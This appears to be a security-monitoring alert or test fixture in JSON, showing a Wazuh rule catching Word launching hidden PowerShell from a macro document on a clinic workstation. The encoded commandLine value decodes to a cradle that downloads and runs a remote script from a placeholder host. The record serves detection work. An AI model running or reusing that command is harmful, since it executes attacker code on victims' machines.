@@ -1,0 +1,59 @@
+{
+  "timestamp": "2026-07-01T10:25:08.207+0000",
+  "rule": {
+    "level": 12,
+    "description": "Encoded PowerShell command launched by an Office application",
+    "id": "100010",
+    "mitre": {
+      "id": ["T1059.001"],
+      "tactic": ["Execution"],
+      "technique": ["PowerShell"]
+    },
+    "firedtimes": 1,
+    "groups": ["windows", "sysmon", "sysmon_event1", "powershell"]
+  },
+  "agent": {
+    "id": "011",
+    "name": "WS-UNMANAGED-07",
+    "ip": "192.0.2.77"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "1782901508.118804",
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "systemTime": "2026-07-01T10:25:07.9915002Z",
+        "eventRecordID": "1977",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "WS-UNMANAGED-07",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "utcTime": "2026-07-01 10:25:07.991",
+        "processId": "7344",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "originalFileName": "PowerShell.EXE",
+        "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUAcwAuAGUAeABhAG0AcABsAGUALgB0AGUAcwB0AC8AcAAuAHAAcwAxACcAKQA=",
+        "currentDirectory": "C:\\Users\\temp07\\Documents\\",
+        "user": "CLINIC\\temp07",
+        "integrityLevel": "Medium",
+        "parentProcessId": "5012",
+        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\temp07\\Downloads\\shift_schedule.docm\""
+      }
+    }
+  }
+}
